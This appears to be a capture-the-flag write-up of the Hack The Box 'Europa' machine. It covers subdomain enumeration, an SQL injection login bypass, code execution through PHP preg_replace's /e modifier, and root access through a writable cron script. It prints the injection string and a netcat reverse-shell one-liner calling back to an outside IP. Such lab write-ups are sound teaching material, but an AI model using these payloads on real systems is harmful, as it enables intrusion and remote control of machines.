---
title: "Hack The Box - Europa"
tags: [linux,medium,SQLi,openvpn config,regex,preg_replace,preg replace,cronjob,exec ]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%201.png)

## Enumerating Web

→ Finding subdomains :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%202.png)

→ There's an login page on admin-portal

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%203.png)

→ We were able to login with simple sqli :

**`admin@europacorp.htb'-- -`**

⇒ There's an openvpn config file generator page. We intercept the request in burp

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%204.png)

→ These `/` are used for regular expressions ( regex ). It replaces the word `ip_address` in our `text` parameter with `test`

## Exploiting preg_replace

[https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%205.png)

⇒ We can exploit `preg replace` by adding `e` after the regex and executing commands through `system` in php

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%206.png)

→  Ran netcat oneliner to get a shell :

**`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.52 1234 >/tmp/f`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%207.png)

## Privilege Escalation to Root

→ There's a crontob running a php script 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%208.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%209.png)

→ It executes script [logcleared.sh](http://logcleared.sh) in /var/www/cmd/

→ Writing to the file an reverse shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%2010.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Europa%20Box%203c0f53c97532473c909d99dd7d129277/Untitled%2011.png)

